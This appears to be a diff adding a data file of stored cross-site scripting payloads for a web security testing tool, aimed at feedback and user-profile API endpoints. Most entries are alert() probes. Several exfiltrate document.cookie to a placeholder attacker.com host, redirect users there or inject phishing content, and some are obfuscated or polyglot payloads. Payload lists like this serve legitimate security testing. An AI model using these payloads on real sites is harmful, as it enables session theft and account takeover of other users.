@@ -1,0 +1,30 @@
+# Stored/Persistent XSS Payloads
+# Format: method|endpoint|payload|expected_code|attack_id|description
+
+# Basic Stored XSS in Comments/Feedback
+POST|/api/Feedbacks|{"comment":"<script>alert('Stored XSS')</script>","rating":5}|201|xss_stored_001|Basic stored script
+POST|/api/Feedbacks|{"comment":"<img src=x onerror='alert(\"XSS\")'>","rating":5}|201|xss_stored_002|Stored img tag
+POST|/api/Feedbacks|{"comment":"<iframe src='javascript:alert(1)'></iframe>","rating":5}|201|xss_stored_003|Iframe injection
+POST|/api/Feedbacks|{"comment":"<svg/onload=alert('XSS')>","rating":5}|201|xss_stored_004|SVG injection
+POST|/api/Feedbacks|{"comment":"<marquee onstart=alert('XSS')>Moving XSS</marquee>","rating":5}|201|xss_stored_005|Marquee tag
+
+# Stored XSS in User Profile
+POST|/rest/user/profile|{"username":"<script>alert('XSS')</script>","bio":"Normal user"}|200|xss_profile_001|Username XSS
+POST|/rest/user/profile|{"username":"user","bio":"<img src=x onerror=alert('XSS')>"}|200|xss_profile_002|Bio field XSS
+POST|/rest/user/profile|{"username":"user","website":"javascript:alert('XSS')"}|200|xss_profile_003|Website field XSS
+POST|/rest/user/profile|{"username":"user","avatar":"<svg onload=alert('XSS')>"}|200|xss_profile_004|Avatar field XSS
+POST|/rest/user/profile|{"username":"user","location":"<script>alert(document.cookie)</script>"}|200|xss_profile_005|Location field XSS
+
+# Advanced Stored XSS Payloads
+POST|/api/Feedbacks|{"comment":"<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>","rating":5}|201|xss_stored_006|Cookie stealing
+POST|/api/Feedbacks|{"comment":"<script>var i=new Image;i.src='http://attacker.com/log?c='+document.cookie;</script>","rating":5}|201|xss_stored_007|Image beacon
+POST|/api/Feedbacks|{"comment":"<script>document.write('<img src=\"http://attacker.com/phish\">')</script>","rating":5}|201|xss_stored_008|Phishing injection
+POST|/api/Feedbacks|{"comment":"<script>window.location='http://attacker.com/redirect'</script>","rating":5}|201|xss_stored_009|Redirect attack
+POST|/api/Feedbacks|{"comment":"<script>eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,99,111,111,107,105,101))</script>","rating":5}|201|xss_stored_010|Obfuscated payload
+
+# Polyglot XSS Payloads
+POST|/api/Feedbacks|{"comment":"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>","rating":5}|201|xss_polyglot_001|Universal XSS polyglot
+POST|/api/Feedbacks|{"comment":"';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>","rating":5}|201|xss_polyglot_002|Multi-context polyglot
+POST|/api/Feedbacks|{"comment":"<img src=1 href=1 onerror=\"javascript:alert(1)\"></img>","rating":5}|201|xss_polyglot_003|Image polyglot
+POST|/api/Feedbacks|{"comment":"<audio src=1 href=1 onerror=\"javascript:alert(1)\"></audio>","rating":5}|201|xss_polyglot_004|Audio polyglot
+POST|/api/Feedbacks|{"comment":"<video src=1 href=1 onerror=\"javascript:alert(1)\"></video>","rating":5}|201|xss_polyglot_005|Video polyglot
